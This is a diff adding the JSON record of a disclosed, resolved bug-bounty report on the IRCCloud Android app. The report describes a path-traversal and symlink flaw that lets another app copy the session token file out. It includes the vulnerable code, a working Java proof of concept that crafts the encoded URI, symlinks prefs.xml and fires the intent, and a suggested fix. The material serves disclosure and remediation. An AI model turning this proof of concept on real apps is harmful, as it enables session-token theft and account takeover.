@@ -1,0 +1,141 @@
+{
+  "id": 288955,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODg5NTU=",
+  "url": "https://hackerone.com/reports/288955",
+  "title": "[IRCCloud Android] Theft of arbitrary files leading to token leakage",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-11-09T20:52:38.854Z",
+  "submitted_at": "2017-11-09T20:52:38.854Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bagipro",
+    "url": "/bagipro",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 140,
+    "url": "https://hackerone.com/irccloud",
+    "handle": "irccloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "IRCCloud",
+      "twitter_handle": "irccloud",
+      "website": "https://www.irccloud.com",
+      "about": "Group chat for teams, friends, and communities. IRCCloud is an IRC client with a future. Stay connected, chat from anywhere, and never miss a message."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-11-15T15:23:32.609Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-11-15T15:23:32.512Z",
+  "team_member_agreed_on_going_public_at": "2017-11-15T15:19:14.932Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "#Bug description#\n\nHi, I'd like to report a vulnerability which allows to theft arbitrary protected files (and as a result takeover account, because all tokens will be leaked), similar to my bug reported to Harvest https://hackerone.com/reports/161710\n\nThis one is really tricky, passed two days to realize how to exploit that ;)\n\nActivity ``` com.irccloud.android.activity.ShareChooserActivity ``` is exported and designed to allow file sharing from third-party apps to IRC Cloud\n```xml\n        <activity android:excludeFromRecents=\"true\" android:name=\"com.irccloud.android.activity.ShareChooserActivity\" android:theme=\"@style/dawnDialog\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n            </intent-filter>\n            <intent-filter>\n                <action android:name=\"android.intent.action.SEND\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <data android:mimeType=\"application/*\"/>\n                <data android:mimeType=\"audio/*\"/>\n                <data android:mimeType=\"image/*\"/>\n                <data android:mimeType=\"text/*\"/>\n                <data android:mimeType=\"video/*\"/>\n            </intent-filter>\n            <meta-data android:name=\"android.service.chooser.chooser_target_service\" android:value=\".ConversationChooserTargetService\"/>\n        </activity>\n```\n\n```java\n    protected void onResume() {\n        //...\n        if (getSharedPreferences(\"prefs\", 0).getString(\"session_key\", \"\").length() > 0) {\n            \t//...\n                this.mUri = (Uri) getIntent().getParcelableExtra(\"android.intent.extra.STREAM\"); // getting attacker provided uri\n                if (this.mUri != null) {\n                    this.mUri = MainActivity.makeTempCopy(this.mUri, this); // copying file from this uri to /data/data/com.irccloud.android/cache/\n                }\n```\n\n```java\n    public static Uri makeTempCopy(Uri fileUri, Context context, String original_filename) { // original_filename = mUri.getLastPathSegment()\n        //...\n        try {\n            Uri out = Uri.fromFile(new File(context.getCacheDir(), original_filename));\n            Log.d(\"IRCCloud\", \"Copying file to \" + out);\n            InputStream is = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openInputStream(fileUri);\n            OutputStream os = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openOutputStream(out);\n            byte[] buffer = new byte[8192];\n            while (true) {\n                int len = is.read(buffer);\n                if (len != -1) {\n                    os.write(buffer, 0, len);\n                //...\n```\n\nIt means that the specified file will be copied to ``` /data/data/com.irccloud.android/cache/ ``` with original name. Original name is ``` getLastPathSegment() ``` from the specified uri. But there is one thing: this method decodes last path segment. This is my PoC:\n```java\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        // path to sdcard (encoded relative path from \"/data/data/com.irccloud.android/cache/\")\n        String zhk = \"..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml\";\n        // absolute path to a file, pointing to sumlink\n        String appDir = \"/data/data/\" + getPackageName();\n        String deepPath = appDir + \"/x/x/x/x/\";\n\n        new File(deepPath).mkdirs();\n\n        String sumlink = deepPath + zhk;\n        try {\n            File sumlinkFile = new File(Uri.decode(sumlink)).getCanonicalFile();\n            sumlinkFile.getParentFile().mkdirs();\n\n            Runtime.getRuntime().exec(\"ln -s /data/data/com.irccloud.android/shared_prefs/prefs.xml \"\n                    + sumlinkFile.getAbsolutePath()).waitFor();\n        }\n        catch(Exception e) {\n            // should be never thrown\n            throw new RuntimeException(e);\n        }\n        grant777PermissionToEverything(new File(appDir));\n\n        Uri uri = Uri.parse(\"file://\" + sumlink); // file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml\n\n        Intent intent = new Intent();\n        intent.setClassName(\"com.irccloud.android\", \"com.irccloud.android.activity.ShareChooserActivity\");\n        intent.putExtra(\"android.intent.extra.STREAM\", uri);\n        startActivity(intent);\n    }\n\n    private void grant777PermissionToEverything(File dist) {\n        dist.setReadable(true, false);\n        dist.setWritable(true, false);\n        dist.setExecutable(true, false);\n        if(dist.isDirectory()) {\n            for(File child : dist.listFiles()) {\n                grant777PermissionToEverything(child);\n            }\n        }\n    }\n```\n\nResult:\n{F238129}\n{F238128}\n\nIt works so:\n1) I start your activity with the following uri: ``` file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml ```\n2) Canonical file from #2 (``` /data/data/com.attacker/sdcard/prefs.xml ```) is a symlink file pointing to the file I want to theft (``` /data/data/com.irccloud.android/shared_prefs/prefs.xml ```)\n3) In your app ``` original_filename ``` is equal to ``` ../../../../sdcard/prefs.xml ```\n4) \n```java\nInputStream is = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openInputStream(fileUri);\n```\n\nBut ``` openInputStream(...) ``` automatically decodes the specified uri. So it will access my symlink file which points to ``` /data/data/com.irccloud.android/shared_prefs/prefs.xml ```\n5) \n```java\nUri out = Uri.fromFile(new File(context.getCacheDir(), original_filename));\nOutputStream os = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openOutputStream(out);\n```\nIt is equal to \n```java\nUri out = Uri.fromFile(new File(\"/data/data/com.irccloud.android/cache/\", \"../../../../sdcard/prefs.xml\"));\n```\n\nSo it simply outputs the specified file to Sd card.\n\n#How to fix#\nJust specify e.g. current timestamp as a file name, but don't use provided by attacker. In current implementation attacker can force IRC Cloud app to copy arbitrary files to arbitrary directories. File ``` /data/data/com.irccloud.android/shared_prefs/prefs.xml ``` contains ``` session_key ```. In normal situation this file is accessible only to IRC Cloud app. But when it's copied to e.g. Sd card it will be accessible to everyone. But Sd card is only simple example. Attacker can also force IRC Cloud app to copy a file to its internal directory.\n\nBTW this vulnerability also allows to overwrite arbitrary files. So attacker also can replace any your protected files and substitute for example history.",
+  "weakness": {
+    "id": 46,
+    "name": "Privacy Violation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 238128,
+      "file_name": "Screenshot_2017-11-09-23-21-29.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/238/128/02be786d66ef5a7bc15aee4a7e1e42f1db8c5768/Screenshot_2017-11-09-23-21-29.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2017-11-09-23-21-29.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2017-11-09-23-21-29.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSM5TYSS4%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T030420Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDw5GjXhifUQbm0a%2BZZh5r17HpLp1N%2FMs9cznLdnnQyIAIhAPbWpZsaaUzotfFaQqCHlu6bLoyEtVdt%2BqUrsrYhu3hVKrsFCKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgyGLAnB2G40BOKzrW4qjwXmCwtMBlh6OGROFIEpgc4RtUkGU%2BNEH4crN8gOvxRaC0pId1LM6%2BQxWi6Yq%2FkQMXLMe6AoJwe9E1bZ%2Bie9eAPTtbpMSQZ1oTMD53ZEcTK1z1BWtnQA5HDgCK6rBxSomkJ2nwdx%2FTvdhcGZKW9MqNQQYxsZqtRi94NTxBLVpcjh%2FwWjEBpcQ72%2B%2FDxSgcsS%2F8LE45QRlHkz%2BqMjNox2h8L%2Fa3rTwfflohe3LJ7fIpvvNn4G3pdFB1SW9OrRWhwhD0jR2CRWVkSup49%2FiTqgkJzEAo5GJ3ASW5sJKSTLQ6GmgyOG6Q%2F2afR0Jm18UiBuV3Ow%2FURddX83FvHb%2BZdR%2F7rPMMbG6CmRQvLcWtSmpWiLO2K9iRFDytDJUvfXud%2BCId%2BnEfCudbrD21usrI9mBoC6rMmtZfhs%2FiefqGUv4fjYDYwdPxiVY294n5srkf531Z4DqyebY8EzCOhKoO2TINtAgo8tuH3L6kcOMtr6Tq0JIFD6mQ4Yvv6eUwjNiNtuB5Hu3lvldbXftneilkcKBCxSPe8EPtc13YIKSiIHW6c8Q0kgp7K3XeJu52dbvepY0S8aSla4BDQnZu9jOInVZlcyF9atzdgfoV6n69b2HrWdNkfl9e93Q7vKn2nLvo6S2VBy%2BZmDaixszZ6icuVY4As4vRGgXauWH29CeGXi9WY4fUb8APguhThc7I7VXPsk38YUEo8cHCeh4vwinCvAhXxiTkP2G1I4QnwZxjxgYnr%2FeOSIXeAmThUxIzhQ9C3HvPhvD%2BMeCWAewQpQGvOwW9KdXxLwo0VPP6BWtWVR94EyhaOZ13uM%2FwCRMe%2BiW2YAlfzbGW86BEJifuMDYc672kQk4O9HlXj%2Fz0lKTB2wmriHMMrw48wGOrABZWoxXRPIJiCeePxj%2Bzxf13YvrwMppSq1DIQeHrN%2BV73MbdI7pGx%2FZ%2BPesC0wZ6YykBBajLUjhdlq77jIBZoNFBJomRqJYShkG4sCBpdhWqhBAWJUfmHJHqrU9%2B8UWUO0EahjpNI70%2BFOiDE6ngWBVOhE3YxVmWbk0Ckt07Ftj2FlUhSkNqqPdIYYbolpz%2Bp3RLcLjiPChFo%2FllUJ4r6RIK7jCzoOrdFik3z7Xb%2BOOmQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=64f87246c12f02b8d466509cca531eb8f7b2c2d56fb918ae3fe52cbaf8f66175",
+      "file_size": 257655,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 238129,
+      "file_name": "Screenshot_2017-11-09-23-21-21.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/238/129/0ba86673ab2ad09bcf1133e57c595a36252db0e7/Screenshot_2017-11-09-23-21-21.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2017-11-09-23-21-21.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2017-11-09-23-21-21.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSM5TYSS4%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T030420Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDw5GjXhifUQbm0a%2BZZh5r17HpLp1N%2FMs9cznLdnnQyIAIhAPbWpZsaaUzotfFaQqCHlu6bLoyEtVdt%2BqUrsrYhu3hVKrsFCKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgyGLAnB2G40BOKzrW4qjwXmCwtMBlh6OGROFIEpgc4RtUkGU%2BNEH4crN8gOvxRaC0pId1LM6%2BQxWi6Yq%2FkQMXLMe6AoJwe9E1bZ%2Bie9eAPTtbpMSQZ1oTMD53ZEcTK1z1BWtnQA5HDgCK6rBxSomkJ2nwdx%2FTvdhcGZKW9MqNQQYxsZqtRi94NTxBLVpcjh%2FwWjEBpcQ72%2B%2FDxSgcsS%2F8LE45QRlHkz%2BqMjNox2h8L%2Fa3rTwfflohe3LJ7fIpvvNn4G3pdFB1SW9OrRWhwhD0jR2CRWVkSup49%2FiTqgkJzEAo5GJ3ASW5sJKSTLQ6GmgyOG6Q%2F2afR0Jm18UiBuV3Ow%2FURddX83FvHb%2BZdR%2F7rPMMbG6CmRQvLcWtSmpWiLO2K9iRFDytDJUvfXud%2BCId%2BnEfCudbrD21usrI9mBoC6rMmtZfhs%2FiefqGUv4fjYDYwdPxiVY294n5srkf531Z4DqyebY8EzCOhKoO2TINtAgo8tuH3L6kcOMtr6Tq0JIFD6mQ4Yvv6eUwjNiNtuB5Hu3lvldbXftneilkcKBCxSPe8EPtc13YIKSiIHW6c8Q0kgp7K3XeJu52dbvepY0S8aSla4BDQnZu9jOInVZlcyF9atzdgfoV6n69b2HrWdNkfl9e93Q7vKn2nLvo6S2VBy%2BZmDaixszZ6icuVY4As4vRGgXauWH29CeGXi9WY4fUb8APguhThc7I7VXPsk38YUEo8cHCeh4vwinCvAhXxiTkP2G1I4QnwZxjxgYnr%2FeOSIXeAmThUxIzhQ9C3HvPhvD%2BMeCWAewQpQGvOwW9KdXxLwo0VPP6BWtWVR94EyhaOZ13uM%2FwCRMe%2BiW2YAlfzbGW86BEJifuMDYc672kQk4O9HlXj%2Fz0lKTB2wmriHMMrw48wGOrABZWoxXRPIJiCeePxj%2Bzxf13YvrwMppSq1DIQeHrN%2BV73MbdI7pGx%2FZ%2BPesC0wZ6YykBBajLUjhdlq77jIBZoNFBJomRqJYShkG4sCBpdhWqhBAWJUfmHJHqrU9%2B8UWUO0EahjpNI70%2BFOiDE6ngWBVOhE3YxVmWbk0Ckt07Ftj2FlUhSkNqqPdIYYbolpz%2Bp3RLcLjiPChFo%2FllUJ4r6RIK7jCzoOrdFik3z7Xb%2BOOmQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5a2f3dc31ceea67d03b14a001605c217038c9dce0c16fb76add481b50b7f4946",
+      "file_size": 336694,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-12-15T15:19:15.036Z",
+  "allow_singular_disclosure_after": -258291905.59979668,
+  "singular_disclosure_allowed": true,
+  "vote_count": 30,
+  "voters": [
+    "arkaic",
+    "jensec",
+    "sheikhrishad0",
+    "europa",
+    "kapytein",
+    "alesandroortiz",
+    "r3y",
+    "eveeez",
+    "khizer47",
+    "4w3",
+    "and 20 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 271,
+    "asset_type": "GOOGLE_PLAY_APP_ID",
+    "asset_identifier": "com.irccloud.android",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
